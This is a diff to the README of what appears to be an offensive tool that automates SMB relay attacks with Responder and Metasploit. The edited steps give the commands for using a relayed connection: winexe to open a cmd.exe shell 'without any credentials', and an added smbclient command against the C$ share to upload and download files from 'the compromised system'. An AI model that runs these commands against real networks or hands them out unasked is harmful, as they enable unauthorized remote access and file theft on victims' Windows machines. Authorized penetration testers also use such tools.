@@ -13,6 +13,8 @@ Automatically performs the SMB relay attack. Uses Responder to poison, Metasploi
 
 4. After a connection is expired (or you expire it), click "choose"
 
-5. On the remote device run: winexe //127.0.0.1 -U "a%a" cmd.exe
+5. run: winexe //127.0.0.1 -U "a%a" cmd.exe
 
 6. If your SMB connection had admin rights, you now have a shell without any credentials.
+
+7. Failing that, try: smbclient -U a%a //127.0.0.1/C$ and you should now have the ability to upload and download stuff from the compromised system
